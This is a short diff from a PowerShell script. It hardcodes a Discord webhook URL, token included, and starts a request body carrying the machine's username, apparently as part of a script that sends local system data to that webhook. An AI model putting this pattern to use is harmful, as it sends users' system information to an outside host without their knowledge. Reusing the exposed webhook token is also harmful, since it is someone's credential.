@@ -58,7 +58,7 @@ param (
     [string]$text 
 )
 
-$hookurl = "$dc"
+$hookurl = "https://discord.com/api/webhooks/1060256518911557672/i1MCnHTQPKf9mjlH5CLV0ksvq5qhY0W8Y6B3xfo_SeeoO7eu2BxlaoDWb0Lp-jkUPMvn"
 
 $Body = @{
   'username' = $env:username
